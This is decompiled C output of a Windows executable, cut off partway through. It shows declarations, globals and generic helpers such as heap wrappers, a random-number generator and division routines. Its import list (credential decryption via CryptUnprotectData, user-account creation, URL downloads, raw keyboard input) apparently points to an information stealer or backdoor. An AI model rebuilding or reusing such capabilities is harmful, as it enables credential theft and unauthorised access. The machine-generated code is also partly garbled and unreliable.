int32_t function_41337b(int32_t a1);
int32_t function_4133fb(void);
int32_t function_41340d(void);
int32_t function_413446(void);
int32_t function_413449(void);
int32_t function_41344c(void);
int32_t function_413473(void);
int32_t function_4134a0(void);
int32_t function_4135d1(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4136a5(void);
int32_t function_4136c8(void);
int32_t function_413893(void);
int32_t function_4138ef(void);
bool function_41390c(int16_t * pszPath);
int32_t function_413915(void);
int32_t function_413960(void);
int32_t function_4139ad(void);
int32_t function_4139e7(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_413ac9(void);
bool function_413ad1(int32_t * hEvent);
int32_t function_413ada(int32_t a1);
int32_t function_413aec(int32_t a1);
int32_t function_413b18(void);
int32_t function_413b22(void);
int32_t function_413b2f(void);
int32_t function_413b7c(int32_t a1, int32_t nNumberOfBytesToRead, int32_t dwMoveMethod);
int32_t function_413bf1(int32_t a1, int32_t a2);
int32_t function_413c12(void);
int32_t function_413c16(void);
int32_t function_413c34(int32_t a1);
int32_t function_413c83(int32_t lpFileName);
int32_t function_413da4(int32_t a1);
int32_t function_413ee1(void);
int32_t function_413ef9(int32_t a1);
int32_t function_413f4f(int32_t dwDesiredAccess);
int32_t function_413f8e(void);
int32_t function_413fc0(void);
int32_t function_413fdb(int32_t a1, int32_t a2);
void function_414018(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_414020(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_414028(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
int32_t function_414030(void);
bool function_41403e(int32_t * hMutex);
int32_t function_414047(void);
int32_t function_41405b(void);
int32_t function_414070(int32_t a1);
int32_t function_414091(int32_t * a1, int32_t a2);
int32_t function_41411e(int32_t a1);
int32_t function_414227(void);
int32_t function_414278(int32_t result, uint32_t a2, int32_t a3);
int32_t function_4143ed(int32_t Offset);
int32_t function_4143f4(void);
int32_t function_414422(uint32_t a1, int32_t * a2);
int32_t function_414498(void);
int32_t function_4144b6(void);
int32_t function_4144f8(void);
int32_t function_41452d(int32_t a1, int32_t a2);
int32_t function_4145a1(void);
int32_t function_4146d3(void);
int32_t function_41471f(void);
int32_t function_41473a(void);
int32_t function_4147a3(void);
int32_t function_414894(int32_t a1, int32_t a2);
int32_t function_4148d1(int32_t a1);
int32_t function_414902(void);
int32_t function_4149a8(int32_t a1, int32_t * a2);
int32_t function_4149ff(void);
int32_t function_414a05(int32_t a1);
int32_t function_414a39(void);
int32_t function_414a3c(int32_t a1);
int32_t function_414a4a(int32_t a1);
int32_t function_414ac7(void);
int32_t function_414af5(int32_t a1);
int32_t function_414ce8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_414cfb(void);
int32_t function_414d03(int32_t a1);
int32_t function_414d25(int32_t * a1);
int32_t function_414d5e(void);
int32_t function_414d63(void);
int32_t function_414d78(int32_t a1, int32_t a2);
int32_t function_414dee(int32_t a1, int32_t * a2, int32_t dwType);
int32_t function_414e25(int32_t hKey, int32_t * a2, int32_t samDesired, int32_t a4);
int32_t function_414e8a(void);
int32_t function_414e90(void);
int32_t function_414eef(int32_t a1, int32_t a2, int32_t a3);
int32_t function_41529e(int32_t * a1);
int32_t function_4154ca(void);
int32_t function_4154ed(int32_t a1, int32_t a2);
int32_t function_415520(void);
int32_t function_415532(int32_t * a1, int32_t a2);
int32_t function_4155ce(int32_t result);
int32_t function_4155e3(void);
int32_t function_41570f(int32_t lpValueName, int32_t * lpString);
int32_t function_415774(void);
int32_t function_4157f0(void);
int32_t function_415884(int32_t a1);
int32_t function_4158f7(void);
int32_t function_415974(void);
int32_t function_415b64(int32_t a1, int32_t * a2);
int32_t function_415c0e(void);
int32_t function_415c2e(void);
int32_t function_415c58(int32_t a1);
int32_t function_415c81(int32_t nNumberOfBytesToWrite);
int32_t function_415cc4(int32_t a1);
int32_t function_415d7c(int32_t nNumberOfBytesToWrite);
int32_t function_415dbf(void);
int32_t function_415dc4(int32_t a1);
int32_t function_415e24(void);
int32_t function_415e27(void);
int32_t function_415e92(void);
int32_t function_415ede(int32_t * a1);
int32_t function_415f1e(void);
int32_t function_415f21(void);
int32_t function_415fe0(void);
int32_t function_4160c3(void);
int32_t function_41614d(int32_t a1);
int32_t function_416233(void);
int32_t function_416265(int32_t * a1);
int32_t function_4163bc(void);
int32_t function_4163f3(int32_t a1, int32_t a2);
int32_t function_41645d(void);
int32_t function_41649c(int32_t a1, int32_t a2, int32_t a3);
int32_t function_416540(void);
int32_t function_41656d(void);
int32_t function_416573(void);
int32_t function_416579(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4165c4(void);
int32_t function_4165c9(int32_t a1, int32_t a2);
int32_t function_416661(void);
int32_t function_41667f(int32_t a1);
int32_t function_4166ec(void);
int32_t function_4166fa(int32_t a1);
int32_t function_416718(void);
int32_t function_416734(void);
int32_t function_41674f(int32_t a1);
int32_t function_4167ca(int32_t a1);
int32_t function_41699c(void);
int32_t function_416af8(int32_t a1, int32_t a2, int32_t * a3, int32_t * a4);
int32_t function_416bc6(int32_t a1, int32_t a2, int32_t a3, uint32_t a4);
int32_t function_416c3c(int32_t result);
int32_t function_416c49(int32_t result);
int32_t function_416c56(int32_t result);
int32_t function_416c63(void);
int32_t function_416c8f(void);
int32_t function_416cf3(int32_t result);
int32_t function_416d09(int32_t a1);
int32_t function_416d82(int32_t a1, int32_t a2);
int32_t function_416f80(int32_t a1);
int32_t function_417000(void);
int32_t function_417004(void);
int32_t function_417008(void);
int32_t function_41700c(void);
int32_t function_41700f(void);
int32_t function_417022(int32_t a1);
int32_t function_41705f(int32_t a1, int32_t a2);
int32_t function_417076(void);
int32_t function_417083(void);
int32_t function_417105(int32_t a1, int32_t a2);
int32_t function_41711c(int32_t a1);
int32_t function_417153(void);
int32_t function_417160(int32_t a1);
int32_t function_4172da(int32_t a1, int32_t a2);
int32_t function_4172f1(void);
int32_t function_4172fe(int32_t result);
int32_t function_41739a(void);
int32_t function_4173b1(void);
int32_t function_4173be(int32_t result);
int32_t function_4174a1(int32_t a1, int32_t a2);
int32_t function_4174af(int32_t a1);
int32_t function_4174cd(int32_t a1, int32_t a2);
int32_t function_417755(void);
int32_t function_417758(void);
int32_t function_41775f(void);
int32_t function_417768(int32_t result);
int32_t function_4177fe(void);
int32_t function_417805(void);
int32_t function_41780e(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_417982(void);
int32_t function_4179b8(int32_t a1);
int32_t function_417bbe(void);
int32_t function_417dc1(int32_t a1);
int32_t function_417dd2(void);
int32_t function_417dd9(void);
int32_t function_417de2(void);
int32_t function_417de6(void);
int32_t function_417de9(void);
int32_t function_417df0(void);
int32_t function_417df9(int32_t a1, int32_t a2);
int32_t function_417e48(void);
int32_t function_417fd8(void);
int32_t function_417ff3(int32_t a1);
int32_t function_418056(int32_t result, int32_t a2);
int32_t function_4180c4(int32_t a1, int32_t a2, int32_t a3);
int32_t function_418108(void);
int32_t function_418129(void);
int32_t function_418134(void);
int32_t function_41813e(void);
int32_t function_418148(void);
int32_t function_418152(void);
int32_t function_41815c(void);
int32_t function_418166(void);
int32_t function_418170(void);
int32_t function_41817a(void);
int32_t function_418184(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x4590f811; // 0x419380
int32_t g2 = -0x4682df45; // 0x419390
int32_t g3 = 0; // 0x4193b0
int32_t g4 = 0x56a86895; // 0x4193c0
int32_t g5 = 0x29840822; // 0x4193d0
int32_t g6 = -0x3e0bff60; // 0x4193e0
int32_t g7 = 0x579154a; // 0x4193f0
int32_t g8 = 0x62be5d10; // 0x419420
int32_t g9 = -0x1bc9144d; // 0x419430
int32_t g10 = -0x1bc91482; // 0x419440
int32_t g11 = -0x1bc91483; // 0x419450
int32_t g12 = -0x1bc91484; // 0x419460
int32_t g13 = 0x40139b; // 0x419480
int32_t g14 = 0x4013b9; // 0x419488
int16_t * g15 = NULL; // 0x419490
int16_t * g17 = (int16_t *)92; // 0x4194e4
int32_t g18 = 0x1354; // 0x4194f4
int32_t g21 = 0x401d72; // 0x41974c
int32_t g22 = 0x401d91; // 0x419754
int32_t g23 = 0x401db0; // 0x41975c
int32_t g24 = 0x401dcf; // 0x419764
int32_t g25 = 0x401ded; // 0x41976c
int32_t g26 = 0x401e0b; // 0x419774
int32_t g27 = 0x401e29; // 0x41977c
int32_t g28 = 0x401e48; // 0x419784
int32_t g29 = 0x401e66; // 0x41978c
int32_t g30 = 0x401e84; // 0x419794
int32_t g31 = 0x401ea3; // 0x41979c
int32_t g32 = 0x401ec1; // 0x4197a4
int32_t g33 = 0x401edf; // 0x4197ac
int32_t g34 = 0x401efd; // 0x4197b4
int32_t g35 = 0x401f1b; // 0x4197bc
int32_t g36 = 0x401f39; // 0x4197c4
int32_t g37 = 0x401f57; // 0x4197cc
int32_t g38 = 0x401f75; // 0x4197d4
int32_t g39 = 0x401f93; // 0x4197dc
int32_t g40 = 0x401fb1; // 0x4197e4
int32_t g41 = 0x40200b; // 0x4197ec
int32_t g42 = 0x40202a; // 0x4197f4
int32_t g43 = 0x402052; // 0x4197fc
int32_t g44 = 0x402070; // 0x419804
int32_t g45 = 0x40208e; // 0x41980c
int32_t g46 = 0x4020ac; // 0x419814
int32_t g47 = 0x4020ca; // 0x41981c
int32_t g48 = 0x4020e8; // 0x419824
int32_t g49 = 0x402106; // 0x41982c
int32_t g50 = 0x402125; // 0x419834
int32_t g51 = 0x40214a; // 0x41983c
int32_t g52 = 0x402152; // 0x419844
int32_t g53 = 0x402171; // 0x41984c
int32_t g54 = 0x40219e; // 0x419854
int32_t g55 = 0x402179; // 0x41985c
int32_t g56 = 0x4021a6; // 0x419864
int32_t g57 = 0x4021c5; // 0x41986c
int32_t g58 = 0x4021e3; // 0x419874
int32_t g59 = 0x402202; // 0x41987c
int32_t g60 = 0x402220; // 0x419884
int32_t g61 = 0x40223f; // 0x41988c
int32_t g62 = 0x40225e; // 0x419894
int32_t g63 = 0x40227d; // 0x41989c
int32_t g64 = 0x40229c; // 0x4198a4
int32_t g65 = 0x4022bb; // 0x4198ac
int32_t g66 = 0x4022da; // 0x4198b4
int32_t g67 = 0x402313; // 0x4198bc
int32_t g68 = 0x402332; // 0x4198c4
int32_t g69 = 0x402351; // 0x4198cc
int32_t g70 = 0x40236f; // 0x4198d4
int32_t g71 = 0x405bc2; // 0x4198dc
int16_t * g72 = (int16_t *)42; // 0x419c98
int16_t * g73 = (int16_t *)123; // 0x419d18
int16_t * g74 = (int16_t *)125; // 0x419d1c
int32_t g76 = 45; // 0x419e40
int32_t g77 = 0x40bf25; // 0x419e80
int32_t g110 = -0x315631f0; // 0x41b4b0
int32_t g116 = 0x402b5d; // 0x41c19c
int32_t g117 = 0x402b5d; // 0x41c1bc
int32_t g118 = -0x23ed5979; // 0x41c2e0
int16_t * g119 = NULL; // 0x41c6b8
int16_t * g120 = (int16_t *)0x4f0053; // 0x41c6bc
int32_t g122 = 0x402d67; // 0x41c800
int32_t g123 = 0x416579; // 0x41c85c
int32_t g124 = 0x29840822; // 0x41c870
int32_t g125 = 0x56a868a9; // 0x41c880
int32_t g126 = 0x6b652fff; // 0x41c890
int32_t g127 = 0x402ec3; // 0x41c8a0
int32_t g128 = 0x402ee2; // 0x41c8d4
int32_t g129 = 0x402f01; // 0x41c904
int32_t g130 = 0x402f20; // 0x41c91c
int32_t g131 = 0x402f3f; // 0x41c924
int32_t g132 = 0x402f5e; // 0x41c99c
int32_t g133 = 0x402f7c; // 0x41c9a4
int32_t g134 = 0x402fbc; // 0x41c9ac
int32_t g135 = 0x402fda; // 0x41c9b4
int128_t g136; // 0x41c9e0
int128_t g137; // 0x41ca00
int128_t g138; // 0x41ca10
int128_t g139; // 0x41ca20
int128_t g140; // 0x41ca30
int128_t g141; // 0x41ca40
int128_t g142; // 0x41ca50
int128_t g143; // 0x41ca60
int128_t g144; // 0x41ca70
int128_t g145; // 0x41ca80
int32_t g146 = 0; // 0x41e000
int32_t g147 = 0x4bf4c442; // 0x41e140
int32_t g148; // 0x41e150
int32_t g149 = -0x741374ab; // 0x41e158
int32_t g151 = 0; // 0x41e55c
int32_t ** g152 = NULL; // 0x41e560
int32_t g153 = 0; // 0x41e564
int128_t g154; // 0x41e568
int32_t g155 = 0; // 0x41e56c
int32_t g156 = 0; // 0x41e570
int32_t g157 = 0; // 0x41e578
int32_t g158 = 0; // 0x41e57c
int64_t g159 = 0; // 0x41e580
int32_t g160 = 0; // 0x41e690
char g161 = 0; // 0x41e694
char g162 = 0; // 0x41e695
int32_t g163 = 0; // 0x41e698
int32_t g164 = 0; // 0x41e69c
int32_t g165 = 0; // 0x41e6a0
int32_t g166 = 0; // 0x41e6a4
int32_t g167 = 0; // 0x41e6a8
int32_t g168 = 0; // 0x41e6ac
char * g169; // 0x41e6b0
int32_t g170 = 0; // 0x41e7b4
char * g171; // 0x41e7b8
int32_t g172 = 0; // 0x41e8bc
int32_t g173 = 0; // 0x41e8c0
int32_t g174 = 0; // 0x41e8c4
int32_t g175 = 0; // 0x41e8c8
int32_t g176 = 0; // 0x41e8d0
int32_t g177 = 0; // 0x42005c
int32_t g178 = 0; // 0x43005c
int32_t g179 = 0; // 0x44005c
int32_t g180 = 0; // 0x440066
int32_t g181 = 0; // 0x450041
int32_t g182 = 0; // 0x45005c
int32_t g183 = 0; // 0x47005c
int32_t g184 = 0; // 0x4d005c
int32_t g185 = 0; // 0x4f0050
int32_t g186 = 0; // 0x4f005c
int32_t g187 = 0; // 0x500025
int32_t g188 = 0; // 0x530025
int32_t g189 = 0; // 0x53005c
int32_t g190 = 0; // 0x54005c
int32_t g191 = 0; // 0x55007b
int32_t g192 = 0; // 0x551bfc
int16_t * g193 = NULL; // 0x551c00
int32_t g194 = 0; // 0x552014
int32_t g195 = 0; // 0x552018
int32_t g196 = 0; // 0x55201c
int32_t g197 = 0; // 0x552020
int32_t g198 = 0; // 0x552024
int32_t g199 = 0; // 0x552028
int32_t g200 = 0; // 0x55202c
int32_t g201 = 0; // 0x552030
int32_t g202 = 0; // 0x552034
int32_t g203 = 0; // 0x552038
int32_t g204 = 0; // 0x55203c
int32_t g205 = 0; // 0x552040
int32_t g206 = 0; // 0x552044
int32_t g207 = 0; // 0x552048
int32_t g208 = 0; // 0x55204c
int32_t g209 = 0; // 0x552050
int32_t g210 = 0; // 0x552054
int32_t g211 = 0; // 0x552058
int32_t g212 = 0; // 0x55205c
int32_t g213 = 0; // 0x552060
int32_t g214 = 0; // 0x552064
int32_t g215 = 0; // 0x552068
int32_t g216 = 0; // 0x55206c
int32_t g217 = 0; // 0x552070
int32_t g218 = 0; // 0x552074
int32_t g219 = 0; // 0x552078
int32_t g220 = 0; // 0x55207c
int32_t g221 = 0; // 0x552080
int32_t g222 = 0; // 0x552084
int32_t g223 = 0; // 0x552088
int32_t g224 = 0; // 0x55208c
int32_t g225 = 0; // 0x552090
int32_t g226 = 0; // 0x552094
int32_t g227 = 0; // 0x552098
int32_t g228 = 0; // 0x55209c
int32_t g229 = 0; // 0x5520a0
int32_t g230 = 0; // 0x5520a4
int32_t g231 = 0; // 0x5520a8
int32_t g232 = 0; // 0x5520ac
int32_t g233 = 0; // 0x5520b0
int32_t g234 = 0; // 0x5520b4
int32_t g235 = 0; // 0x5520b8
int32_t g236 = 0; // 0x5520bc
int32_t g237 = 0; // 0x5520c0
int32_t g238 = 0; // 0x5520c4
int32_t g239 = 0; // 0x5520c8
int32_t g240 = 0; // 0x5520cc
int32_t g241 = 0; // 0x5520d0
int128_t g242; // 0x5520d8
int32_t g243 = 0; // 0x5520dc
int32_t g244 = 0; // 0x5520e8
int32_t g245 = 0; // 0x5520f0
int32_t g246 = 0; // 0x5520f4
int32_t g247 = 0; // 0x5520f8
int32_t g248 = 0; // 0x552104
int32_t g249 = 0; // 0x552b0c
struct _RTL_CRITICAL_SECTION * g250 = NULL; // 0x552b14
int32_t g251 = 0; // 0x552b18
struct _RTL_CRITICAL_SECTION * g252 = NULL; // 0x552b1c
struct _RTL_CRITICAL_SECTION * g253 = NULL; // 0x552b20
int32_t g254 = 0; // 0x552b38
int32_t g255 = 0; // 0x552b3c
int32_t g256 = 0; // 0x552b40
int32_t g257 = 0; // 0x552b44
int32_t g258 = 0; // 0x552b48
int128_t g259; // 0x552b64
int32_t g260 = 0; // 0x552b74
int32_t g261 = 0; // 0x552b78
int128_t g262; // 0x552f3c
int32_t g263 = 0; // 0x552f4c
int32_t g264 = 0; // 0x552f68
int32_t g265 = 0; // 0x552f6c
int32_t g266 = 0; // 0x552f70
int32_t g267 = 0; // 0x552f74
int32_t g268 = 0; // 0x552f78
int32_t g269 = 0; // 0x552f7c
int32_t g270 = 0; // 0x552f80
int32_t g271 = 0; // 0x552f84
int128_t g272; // 0x552f8c
int128_t g273; // 0x552f9c
int32_t g274 = 0; // 0x552fac
int32_t g275 = 0; // 0x552fb0
int32_t g276 = 0; // 0x552fb4
int128_t g277; // 0x552fc8
int128_t g278; // 0x552fd8
int128_t g279; // 0x552fe8
int128_t g280; // 0x552ff8
int32_t g281 = 0; // 0x553008
int32_t g282 = 0; // 0x55300c
struct _RTL_CRITICAL_SECTION * g283 = NULL; // 0x553050
int32_t g284 = 0; // 0x553068
int32_t g285 = 0; // 0x55306c
int32_t g286 = 0; // 0x553070
int32_t g287 = 0; // 0x553074
int32_t g288 = 0; // 0x553078
int32_t g289 = 0; // 0x553080
int32_t g290 = 0; // 0x553084
int32_t g291 = 0; // 0x553088
int32_t g292 = 0; // 0x55308c
int32_t g293 = 0; // 0x553090
int32_t g294 = 0; // 0x553094
int32_t g295 = 0; // 0x553098
int32_t g296 = 0; // 0x55309c
int32_t g297 = 0; // 0x5530a0
int32_t g298 = 0; // 0x5530a4
int32_t g299 = 0; // 0x5530a8
int32_t g300 = 0; // 0x5530ac
int32_t g301 = 0; // 0x5530b0
int32_t g302 = 0; // 0x5530b4
int32_t g303 = 0; // 0x5530b8
int32_t g304 = 0; // 0x5530bc
int32_t g305 = 0; // 0x5530c0
int32_t g306 = 0; // 0x5530c4
int32_t g307 = 0; // 0x5530c8
int32_t g308 = 0; // 0x5530d0
int32_t g309 = 0; // 0x5530d4
int32_t g310 = 0; // 0x5530d8
int32_t g311 = 0; // 0x5530dc
int32_t g312 = 0; // 0x5530e0
int32_t g313 = 0; // 0x5530e4
int32_t g314 = 0; // 0x5530e8
int32_t g315 = 0; // 0x5530ec
int32_t g316 = 0; // 0x5530f0
int32_t g317 = 0; // 0x5530f8
int32_t g318 = 0; // 0x5530fc
int32_t g319 = 0; // 0x553100
int32_t g320 = 0; // 0x553104
int32_t g321;
int32_t g322;
int32_t * g16 = &g184; // 0x419494
int32_t * g19 = &g179; // 0x41959c
int32_t * g20 = &g184; // 0x419644
int32_t * g75 = &g191; // 0x419d20
int32_t * g78 = &g183; // 0x41a028
int32_t * g79 = &g183; // 0x41a078
int32_t * g80 = &g183; // 0x41a0e0
int32_t * g81 = &g183; // 0x41a138
int32_t * g82 = &g183; // 0x41a190
int32_t * g83 = &g182; // 0x41a1f8
int32_t * g84 = &g182; // 0x41a250
int32_t * g85 = &g184; // 0x41a2b8
int32_t * g86 = &g184; // 0x41a308
int32_t * g87 = &g190; // 0x41a420
int32_t * g88 = &g190; // 0x41a478
int32_t * g89 = &g186; // 0x41a4d8
int32_t * g90 = &g186; // 0x41a530
int32_t * g91 = &g177; // 0x41a580
int32_t * g92 = &g177; // 0x41a5c0
int32_t * g93 = &g178; // 0x41a608
int32_t * g94 = &g178; // 0x41a648
int32_t * g95 = &g177; // 0x41a698
int32_t * g96 = &g177; // 0x41a700
int32_t * g97 = &g178; // 0x41a808
int32_t * g98 = &g178; // 0x41a858
int32_t * g99 = &g190; // 0x41a8b0
int32_t * g100 = &g190; // 0x41a8f0
int32_t * g101 = &g189; // 0x41a938
int32_t * g102 = &g189; // 0x41a978
int32_t * g103 = &g178; // 0x41a9c8
int32_t * g104 = &g178; // 0x41aa10
int32_t * g105 = &g190; // 0x41ad9c
int32_t * g106 = &g185; // 0x41ae04
int32_t * g107 = &g185; // 0x41ae1c
int32_t * g108 = &g185; // 0x41ae48
int32_t * g109 = &g181; // 0x41b40c
int32_t * g111 = &g187; // 0x41bacc
int32_t * g112 = &g187; // 0x41bb10
int32_t * g113 = &g184; // 0x41bb30
int32_t * g114 = &g188; // 0x41bc30
int32_t * g115 = &g180; // 0x41c0e8
int32_t * g121 = &g189; // 0x41c6ec
int32_t * g150 = &g117; // 0x41e558

// ------- Dynamically Linked Functions Without Header --------

int32_t BCryptDecrypt(int32_t * a1, char * a2, int32_t a3, int32_t * a4, char * a5, int32_t a6, char * a7, int32_t a8, int32_t * a9, int32_t a10);
int32_t BCryptGenerateSymmetricKey(int32_t * a1, int32_t ** a2, char * a3, int32_t a4, char * a5, int32_t a6, int32_t a7);
int32_t BCryptOpenAlgorithmProvider(int32_t ** a1, int16_t * a2, int16_t * a3, int32_t a4);
int32_t BCryptSetProperty(int32_t * a1, int16_t * a2, char * a3, int32_t a4, int32_t a5);
int32_t * CreateToolhelp32Snapshot(int32_t a1, int32_t a2);
bool CryptStringToBinaryA(char * a1, int32_t a2, int32_t a3, char * a4, int32_t * a5, int32_t * a6, int32_t * a7);
bool CryptStringToBinaryW(int16_t * a1, int32_t a2, int32_t a3, char * a4, int32_t * a5, int32_t * a6, int32_t * a7);
bool CryptUnprotectData(struct _CRYPTOAPI_BLOB * a1, int16_t ** a2, struct _CRYPTOAPI_BLOB * a3, int32_t * a4, struct {int32_t e0; int32_t e1; int32_t * e2; int16_t * e3;} * a5, int32_t a6, struct _CRYPTOAPI_BLOB * a7);
bool GetFileSizeEx(int32_t * a1, struct _LARGE_INTEGER * a2);
int32_t GetRawInputData(int32_t a1, int32_t a2, int32_t * a3, int32_t * a4, int32_t a5);
bool GlobalMemoryStatusEx(struct _MEMORYSTATUSEX * a1);
int16_t * InetNtopW(int32_t a1, int32_t * a2, int16_t * a3, int32_t a4);
bool InternetTimeToSystemTimeA(char * a1, struct _SYSTEMTIME * a2, int32_t a3);
bool IsUserAnAdmin(void);
bool IsWow64Process(int32_t * a1, bool * a2);
int32_t K32GetModuleFileNameExW(void);
int32_t NetLocalGroupAddMembers(int16_t * a1, int16_t * a2, int32_t a3, char * a4, int32_t a5);
int32_t NetUserAdd(int16_t * a1, int32_t a2, char * a3, int32_t * a4);
char * PathCombineA(char * a1, char * a2, char * a3);
bool PathFileExistsW(int16_t * a1);
int16_t * PathFindExtensionW(int16_t * a1);
int16_t * PathFindFileNameW(int16_t * a1);
bool PathRemoveFileSpecA(char * a1);
bool Process32First(int32_t * a1, struct tagPROCESSENTRY32 * a2);
bool Process32FirstW(int32_t * a1, struct tagPROCESSENTRY32W * a2);
bool Process32Next(int32_t * a1, struct tagPROCESSENTRY32 * a2);
bool Process32NextW(int32_t * a1, struct tagPROCESSENTRY32W * a2);
bool RegisterRawInputDevices(struct tagRAWINPUTDEVICE * a1, int32_t a2, int32_t a3);
bool SetDllDirectoryW(int16_t * a1);
int32_t SHCreateDirectoryExW(int32_t * a1, int16_t * a2, struct _SECURITY_ATTRIBUTES * a3);
int32_t SHGetFolderPathW(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int16_t * a5);
int32_t SHGetKnownFolderPath(int32_t a1, int32_t a2, int32_t * a3, int16_t ** a4);
bool SHGetSpecialFolderPathW(int32_t * a1, int16_t * a2, int32_t a3, bool a4);
char * StrStrA(char * a1, char * a2);
int16_t * StrStrW(int16_t * a1, int16_t * a2);
int32_t URLDownloadToFileW(int32_t * a1, int16_t * a2, int16_t * a3, int32_t a4, int32_t * a5);
int32_t WsFileTimeToDateTime(struct _FILETIME * a1, struct _WS_DATETIME * a2, struct {int32_t e0;} * a3);

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x401014
int32_t function_401000(int32_t a1) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g322, (int32_t)&g322); // 0x40100d
    return (int32_t)v1;
}

// Address range: 0x401014 - 0x401028
int32_t function_401014(int32_t a1) {
    // 0x401014
    return HeapFree(GetProcessHeap(), (int32_t)&g322, &g322);
}

// Address range: 0x401028 - 0x401032
int32_t function_401028(int32_t result) {
    // 0x401028
    g159 = result;
    return result;
}

// Address range: 0x401032 - 0x401050
int32_t function_401032(void) {
    int32_t v1 = 0x343fd * (int32_t)g159 + 0x269ec3; // 0x40103d
    g159 = v1;
    return v1 / 0x10000 % 0x8000;
}

// Address range: 0x401050 - 0x40107e
int32_t function_401050(int32_t a1, int32_t a2) {
    int32_t * hHeap = GetProcessHeap();
    if (a1 == 0) {
        // 0x40106f
        return (int32_t)HeapAlloc(hHeap, (int32_t)&g322, (int32_t)&g322);
    }
    int32_t * v1 = HeapReAlloc(hHeap, (int32_t)&g322, &g322, (int32_t)&g322); // 0x401068
    return (int32_t)v1;
}

// Address range: 0x40107e - 0x401098
int32_t function_40107e(int32_t a1, int32_t a2) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g322, (int32_t)&g322); // 0x401091
    return (int32_t)v1;
}

// Address range: 0x401098 - 0x4010f6
int32_t function_401098(int32_t result, int16_t * a2) {
    // 0x401098
    if (*a2 == 0) {
        // 0x4010ef
        return result;
    }
    int16_t v1 = *(int16_t *)result; // 0x4010aa
    int32_t result2 = 0; // 0x4010b0
    if (v1 == 0) {
      lab_0x4010ef_3:
        // 0x4010ef
        return result2;
    }
    int32_t v2 = (int32_t)a2;
    int32_t v3 = result - v2; // 0x4010b5
    int16_t v4 = v1; // 0x4010b5
    int32_t v5 = result; // 0x4010b5
    int32_t v6; // 0x401098
    int16_t * v7; // 0x401098
    int32_t v8; // 0x401098
    while (true) {
      lab_0x4010b7:
        // 0x4010b7
        v8 = v5;
        v6 = v3;
        v7 = a2;
        if (v4 != 0) {
            int32_t v9 = v2;
            int16_t * v10 = (int16_t *)v9;
            uint16_t v11 = *v10; // 0x4010c0
            result2 = v8;
            if (v11 == 0) {
                return result2;
            }
            int32_t v12 = (int32_t)*(int16_t *)(v9 + v6) - (int32_t)v11; // 0x4010cf
            v7 = v10;
            while (v12 == 0) {
                int32_t v13 = v9 + 2; // 0x4010d4
                int32_t v14 = v13; // 0x4010d9
                if (*(int16_t *)(v13 + v6) == (int16_t)v12) {
                    // 0x4010d3
                    v7 = (int16_t *)v13;
                    goto lab_0x4010db;
                }
                v9 = v14;
                v10 = (int16_t *)v9;
                v11 = *v10;
                result2 = v8;
                if (v11 == 0) {
                    return result2;
                }
                // 0x4010c8
                v12 = (int32_t)*(int16_t *)(v9 + v6) - (int32_t)v11;
                v7 = v10;
            }
        }
        goto lab_0x4010db;
    }
    // 0x4010ef
    return result2;
  lab_0x4010db:
    // 0x4010db
    result2 = v8;
    if (*v7 == 0) {
        return result2;
    }
    // 0x4010e1
    v5 = v8 + 2;
    v4 = *(int16_t *)v5;
    v3 = v6 + 2;
    result2 = 0;
    if (v4 == 0) {
        return result2;
    }
    goto lab_0x4010b7;
}

// Address range: 0x401100 - 0x401134
int32_t function_401100(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x401100
    return a3 * a1;
}

// Address range: 0x401140 - 0x4011a8
int32_t function_401140(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4) {
    int32_t v1 = a1; // 0x401148
    uint32_t v2 = a4; // 0x401148
    int32_t v3 = a3; // 0x401148
    if (a4 == 0) {
        int32_t result = (0x100000000 * (int64_t)(a2 % a3) | (int64_t)a1) / (int64_t)a3; // 0x401160
        // 0x4011a3
        return result;
    }
    v3 = 0x80000000 * (int32_t)(v2 % 2 != 0) | v3 / 2;
    uint32_t v4 = a2 / 2; // 0x401174
    v1 = 0x80000000 * (int32_t)(a2 % 2 != 0) | v1 / 2;
    while (v2 >= 2) {
        // 0x401170
        v2 /= 2;
        uint32_t v5 = v4;
        v3 = 0x80000000 * (int32_t)(v2 % 2 != 0) | v3 / 2;
        v4 = v5 / 2;
        v1 = 0x80000000 * (int32_t)(v5 % 2 != 0) | v1 / 2;
    }
    uint64_t v6 = (0x100000000 * (int64_t)v4 | (int64_t)v1) / (int64_t)v3; // 0x40117c
    int32_t result2 = v6; // 0x40117c
    uint64_t v7 = (v6 & 0xffffffff) * (int64_t)a3; // 0x40118a
    uint32_t v8 = (int32_t)(v7 / 0x100000000); // 0x40118a
    uint32_t v9 = result2 * a4 + v8; // 0x40118c
    if (v9 < v8 || v9 > a2 || (int32_t)v7 > a1 == v9 >= a2) {
        // 0x4011a3
        return result2 - 1;
    }
    // 0x4011a3
    return result2;
}

// Address range: 0x4011b0 - 0x401225
int32_t function_4011b0(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4) {
    int32_t v1 = a1; // 0x4011b7
    uint32_t v2 = a4; // 0x4011b7
    int32_t v3 = a3; // 0x4011b7
    if (a4 == 0) {
        int32_t result = (0x100000000 * (int64_t)(a2 % a3) | (int64_t)a1) % (int64_t)a3; // 0x4011cf
        // 0x401221
        return result;
    }
    v3 = 0x80000000 * (int32_t)(v2 % 2 != 0) | v3 / 2;
    uint32_t v4 = a2 / 2; // 0x4011e3
    v1 = 0x80000000 * (int32_t)(a2 % 2 != 0) | v1 / 2;
    while (v2 >= 2) {
        // 0x4011df
        v2 /= 2;
        uint32_t v5 = v4;
        v3 = 0x80000000 * (int32_t)(v2 % 2 != 0) | v3 / 2;
        v4 = v5 / 2;
        v1 = 0x80000000 * (int32_t)(v5 % 2 != 0) | v1 / 2;
    }
    uint64_t v6 = (0x100000000 * (int64_t)v4 | (int64_t)v1) / (int64_t)v3; // 0x4011eb
    uint64_t v7 = (v6 & 0xffffffff) * (int64_t)a3; // 0x4011f4
